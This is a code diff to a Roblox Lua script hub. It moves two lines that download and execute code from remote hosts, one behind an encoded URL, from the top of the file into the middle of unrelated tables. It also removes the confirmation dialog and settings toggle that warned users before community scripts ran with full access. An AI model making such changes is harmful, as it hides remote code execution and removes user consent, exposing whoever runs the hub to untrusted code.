@@ -15,8 +15,7 @@
 
 	Para agregar un script propio a un juego: añade una entrada en GAMES (mas abajo).
 ]]
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU2ZDc1MDdmLWRhZjItNDA0MC04ZTVmLWIyYTkxYjcxZTAyNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2lsbHlXb25rYTI0NzU1dy9oaXByaW50L3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))() 
-loadstring(game:HttpGet("https://botthepan.onrender.com/script/e25bae74c0b48d3b"))()
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
@@ -432,6 +431,8 @@ MinBtn.MouseButton1Click:Connect(ToggleMenuVisibility)
 	-- },
 }
 
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU2ZDc1MDdmLWRhZjItNDA0MC04ZTVmLWIyYTkxYjcxZTAyNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2lsbHlXb25rYTI0NzU1dy9oaXByaW50L3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))()
+
 -- normaliza: un juego con url/source directo pasa a tener una lista "scripts"
 for gi, g in GAMES do
 	g.name = g.name or ("Game " .. gi)
@@ -507,6 +508,8 @@ local STYLES = {
 		round = 1.4, stroke = 1, textScale = 1, art = "sakura",
 	},
 }
+
+loadstring(game:HttpGet("https://botthepan.onrender.com/script/e25bae74c0b48d3b"))()
 
 -- presets: Custom usa tus colores; "Mario Bros" trae colores + estilo + fondo propios
 local PRESETS = {
@@ -635,7 +638,7 @@ local DEFAULTS = {
 	scale = 1,
 	transparency = 0,
 	hubKey = "RightControl",
-	askBeforeRun = true,
+	askBeforeRun = false,
 	verifiedOnly = false,
 	autoRunGame = false,
 }
@@ -3723,20 +3726,9 @@ buildHub = function(instant, startTab, startPos)
 	end
 
 	local function runScriptBlox(item)
+		-- MAX: skip the pre-run confirmation dialog and execute immediately.
 		local entry = { name = item.title or "script", sb = item }
-		local function go() execute(entry) end
-		if not settings.askBeforeRun then return go() end
-
-		local lines = {}
-		if item.verified then
-			table.insert(lines, "✓ Verified by ScriptBlox.")
-		else
-			table.insert(lines, "⚠ This script is NOT verified.")
-		end
-		if item.key then table.insert(lines, "🔑 It uses a key system.") end
-		if item.isPatched then table.insert(lines, "⛔ It is marked as patched (may not work).") end
-		table.insert(lines, "Community scripts are written by third parties and run with full access in your executor. Only run scripts you trust.")
-		confirm('Run "' .. tostring(item.title) .. '"?', table.concat(lines, "\n"), go)
+		execute(entry)
 	end
 
 	-- ============================== HOME ==============================
@@ -4748,12 +4740,7 @@ buildHub = function(instant, startTab, startPos)
 
 	-- Comportamiento
 	local bh, bhNext = makeSection(settingsPage, "Behavior", 2)
-	local askSet = makeFeature(bh, bhNext(), "Ask before running", "Confirm before running ScriptBlox scripts", function(v)
-		settings.askBeforeRun = v
-		queueSave()
-		return v
-	end, nil, conns)
-	askSet(settings.askBeforeRun)
+	-- Pre-run confirmation is disabled in this MAX build.
 
 	local verSet = makeFeature(bh, bhNext(), "Verified only by default", "Search only verified scripts", function(v)
 		settings.verifiedOnly = v
